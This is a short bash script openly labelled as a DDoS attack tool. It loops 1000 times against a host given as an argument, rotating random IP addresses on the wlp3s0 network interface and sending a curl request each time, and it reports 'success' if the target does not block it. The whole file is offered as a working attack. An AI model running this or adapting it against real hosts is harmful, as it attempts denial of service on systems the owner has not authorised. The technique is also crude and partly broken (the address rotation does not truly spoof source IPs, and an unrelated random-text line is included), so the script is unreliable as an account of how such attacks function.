#!/usr/bin/env bash


# get host to perform attack
HOST=$1

# message
echo "Starting DDoS attack ...";

echo "performing at:";

# print date to set attack
date "+%Y/%m/%d %H:%M:%S";

echo "\n";

# make a loop to perform attack
for _ in {1..1000}
do
  IP=$(printf "%d.%d.%d.%d\n" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))" "$((RANDOM % 256 ))")
  ip link set dev wlp3s0 down
  ip addr add "$IP" dev wlp3s0
  ip link set dev wlp3s0 up

  TMP=$(curl -i -X GET "$HOST")
  echo Got: "$TMP"

  if [[ "$TMP" == *"400"* ]]; then
    echo "System is secure on DDoS attack!"
    exit 1;
  fi

  cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 10

  sleep 1s;
done

echo "Sent 1000 http requests using different IPs!";

sleep 5s;

echo "System did not block me on DDoS attack!";

exit 0;
